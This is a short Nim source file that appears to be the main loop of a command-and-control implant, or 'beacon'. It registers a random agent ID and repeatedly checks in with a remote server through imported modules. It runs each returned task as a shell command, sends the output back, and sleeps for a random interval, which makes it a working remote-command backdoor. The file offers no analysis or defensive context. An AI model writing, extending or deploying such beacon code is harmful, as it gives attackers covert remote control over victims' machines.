import os, json, strformat
import utils, comms, config

proc main() =
  randomize()

  let agentID = genID()
  echo fmt"[+] Beacon started with ID {agentID}"

  while true:
    echo "[*] Sending checkin..."
    let response = sendCheckin(agentID)

    if response.len > 0:
      echo fmt"[+] Task received: {response}"
      # In MVP: treat response as a simple shell command
      let task = response
      let output = execProcess(task)
      discard sendTaskResult(agentID, output)

    randomSleep(SLEEP_MIN, SLEEP_MAX)

when isMainModule:
  main()
